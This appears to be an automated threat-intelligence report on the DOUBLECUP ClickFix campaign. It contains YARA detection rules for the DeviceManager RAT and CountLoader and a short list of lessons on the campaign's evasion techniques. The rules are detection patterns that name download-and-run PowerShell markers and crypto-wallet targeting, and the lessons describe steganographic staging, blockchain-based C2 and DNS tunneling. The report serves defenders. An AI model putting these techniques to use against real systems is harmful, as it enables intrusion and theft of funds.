<!-- audit: yarac exit 0. DeviceManager positive test used synthetic sample with published strings (task names + func names + eth contract address); not a real captured binary — labeled accordingly. CountLoader untested against real sample. DeviceManager contract address 0xc027490af56a9d7050fc259ecd03da1580b84aae is unique and functions get_data_selector/build_tag_token/device_hash/global_key are campaign-specific. -->
<!-- revision: relabeled DeviceManager sample provenance from "fired ✓" to "synthetic ✓"; split CountLoader sample status to "untested"; fixed $cross_compile string to include path separators. -->
```yara
rule Malware_DeviceManager_RAT_DOUBLECUP
{
    meta:
        description = "Detects DeviceManager RAT delivered by DOUBLECUP loader-as-a-service based on characteristic strings and behavioral markers"
        author = "Actioner"
        date = "2026-08-04"
        reference = "https://socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/"
        hash = "6e08cb5602f63bee2b40739167b4aef77763bc8fb47b4839ca2fc1607ad35cba"
        severity = "high"

    strings:
        $config = "config.json" ascii
        $log = "agent.log" ascii
        $task1 = "MicroUpdaterV1" ascii wide
        $task2 = "PythonAppUpdater" ascii wide
        $dir = "Microsoft.PythonApp_" ascii
        $func1 = "get_data_selector" ascii
        $func2 = "device_hash" ascii
        $func3 = "build_tag_token" ascii
        $func4 = "global_key" ascii
        $eth1 = "eth_call" ascii
        $eth2 = "0xc027490af56a9d7050fc259ecd03da1580b84aae" ascii nocase
        $eth3 = "0x1dcf296b" ascii
        $dns1 = "microsoft.com" ascii
        $dns2 = "_dm_task" ascii

    condition:
        filesize < 5MB and
        (
            (3 of ($func*) and 1 of ($eth*)) or
            (2 of ($task*) and $dir) or
            ($eth2 and 1 of ($func*)) or
            ($config and $log and 2 of ($func*)) or
            (2 of ($dns*) and 2 of ($func*))
        )
}

rule Malware_CountLoader_DOUBLECUP
{
    meta:
        description = "Detects CountLoader malware associated with DOUBLECUP campaigns based on persistence task names and PE masquerading artifacts"
        author = "Actioner"
        date = "2026-08-04"
        reference = "https://socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/"
        hash = "bdf28e611d77362c40a0445655a35943c03accf21bb9a5af755da7eac5ea5e40"
        severity = "high"

    strings:
        $task1 = "GoogleUpdateService{" ascii wide
        $task2 = "MSEdgeUpdateService{" ascii wide
        $irm = "irm" ascii wide fullword
        $iex = "iex" ascii wide fullword
        $bypass = "-ep bypass" ascii wide nocase
        $wallet_check1 = "MetaMask" ascii wide
        $wallet_check2 = "Phantom" ascii wide
        $wallet_check3 = "Binance" ascii wide
        $signal = "Signal" ascii wide fullword
        $cross_compile = "source\\repos\\TestApp\\Mac_C" ascii

    condition:
        filesize < 10MB and
        (
            (1 of ($task*) and ($irm or $iex) and $bypass) or
            ($cross_compile) or
            (1 of ($task*) and 2 of ($wallet_check*)) or
            ($signal and 2 of ($wallet_check*) and 1 of ($task*))
        )
}
```

## Lessons Learned

1. **ClickFix-as-a-Service is maturing.** DOUBLECUP demonstrates that ClickFix has evolved from ad-hoc social engineering into a managed, licensed platform with automated payload building, steganography, and session management. Defenders should expect increasing volume and operator diversity.

2. **Browser cache is an attack surface.** Using legitimate browser caching to stage steganographic payloads is a novel evasion technique that bypasses file-download monitoring. Organizations should monitor command-line tools accessing browser cache directories.

3. **Blockchain C2 complicates takedowns.** EtherHiding via Ethereum/Polygon smart contracts provides censorship-resistant C2 resolution. Traditional domain/IP blocklisting is insufficient; monitoring for `eth_call` traffic from non-blockchain workloads is a new detection surface.

4. **Environmental keying defeats sandboxes.** PBKDF2 key derivation from the victim's public IP means dynamic analysis in sandboxes with different IPs will fail to decrypt payloads. Analysts need IP-aware detonation environments or must extract keys manually.

5. **DNS tunneling under trusted domains is effective.** DeviceManager's use of microsoft.com as a DNS query suffix blends C2 traffic with legitimate Microsoft DNS traffic, requiring defenders to inspect subdomain patterns rather than relying on domain reputation alone.

## Sources

- [SOCRadar - Introducing DOUBLECUP, a ClickFix Loader Delivering CountLoader and DeviceManager RATs](https://socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/) -- primary technical analysis; source of all IOCs and detailed TTP descriptions
- [BleepingComputer - New DOUBLECUP ClickFix service hides malware in browser cache images](https://www.bleepingcomputer.com/news/security/new-doublecup-clickfix-service-hides-malware-in-browser-cache-images/) -- initial reporting with attack chain overview and service description
- [The Hacker News - DOUBLECUP Uses ClickFix and Cached PNGs](https://thehackernews.com/2026/08/doublecup-uses-clickfix-and-cached-pngs.html) -- secondary reporting with DeviceManager C2 IP and additional infection chain details
- [Mallory.ai - CountLoader Malware Profile](https://mallory.ai/malware/019abbe3-2ce7-70b9-abe2-f2ad4411e0ad) -- CountLoader historical intelligence, delivery mechanisms, and MITRE ATT&CK coverage

---
*Report generated by Actioner*
